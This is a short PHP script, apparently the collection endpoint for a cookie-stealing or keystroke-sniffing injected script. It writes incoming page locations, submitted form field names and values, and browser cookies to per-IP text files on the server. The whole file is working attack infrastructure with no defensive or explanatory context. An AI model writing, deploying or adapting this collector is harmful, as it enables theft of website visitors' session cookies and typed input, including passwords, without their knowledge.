<?php
if(isset($_GET['lo'])){
	$file = fopen($_SERVER['REMOTE_ADDR'].'.txt', 'a');
	fputs($file, "[".date('m-d-Y H:i:s')."](".$_GET['lo'].")");
	if(isset($_POST['input_name'], $_POST['input_value'])){
		fputs($file, "([".$_POST['input_name']."]=>\"".$_POST['input_value']."\")");
	}
	else {
		if($_POST['cookie'] != ""){
			fputs($file, "(Cookie: ".$_POST['cookie'].")");
		}
	}
	fputs($file, "\n");
	fclose($file);
}